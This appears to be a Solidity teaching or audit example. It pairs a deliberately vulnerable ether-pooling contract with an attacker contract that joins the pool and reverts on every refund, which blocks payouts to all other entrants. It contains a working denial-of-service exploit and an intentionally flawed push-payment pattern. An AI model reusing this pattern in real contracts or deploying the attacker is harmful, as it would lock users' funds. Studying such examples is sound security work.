// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/**
 * @title MishandlingOfEth
 * @dev A contract that allows users to pool their ether and sends it back at some point.
 */
contract MishandlingOfEth {
    address[] public entrants;
    uint256 public constant AMOUNT = 1 ether;

    /**
     * @notice Allows a user to enter the pool by sending exactly 1 ether.
     * @dev Adds the sender's address to the entrants array if the sent value is 1 ether.
     */
    function enter() public payable {
        if (msg.value == AMOUNT) {
            entrants.push(msg.sender);
        }
    }

    /**
     * @notice Sends back 1 ether to each entrant.
     * @dev Iterates over the entrants array and sends 1 ether to each address.
     * Deletes the entrants array after sending the ether.
     * @dev This function is vulnerable to reentrancy attacks and gas limit issues.
     */
    function sendBack() public {
        for (uint256 i = 0; i < entrants.length; i++) {
            (bool success,) = payable(entrants[i]).call{value: AMOUNT}("");
            require(success);
        }
        delete entrants;
    }
}

/// @title MishandlingOfEthAttacker Contract
/// @notice This contract is designed to attack the MishandlingOfEth contract by exploiting its vulnerabilities.
/// @dev This contract sends 1 ether to the MishandlingOfEth contract and reverts any ether sent to it.

contract MishandlingOfEthAttacker {
    /// @notice The target contract that this contract will attack.
    MishandlingOfEth mishandlingOfEth;

    /// @notice Constructor to initialize the target contract.
    /// @param _mishandlingOfEth The address of the MishandlingOfEth contract to be attacked.
    constructor(MishandlingOfEth _mishandlingOfEth) {
        mishandlingOfEth = _mishandlingOfEth;
    }

    /// @notice Function to initiate the attack by sending 1 ether to the target contract.
    /// @dev This function calls the `enter` function of the MishandlingOfEth contract with 1 ether.
    function attack() public payable {
        mishandlingOfEth.enter{value: 1 ether}();
    }

    /// @notice Fallback function to handle incoming ether and revert the transaction.
    /// @dev This function reverts any ether sent to this contract.
    receive() external payable {
        revert();
    }

    /// @notice Fallback function to handle incoming ether and revert the transaction.
    /// @dev This function reverts any ether sent to this contract.
    fallback() external payable {
        revert();
    }
}
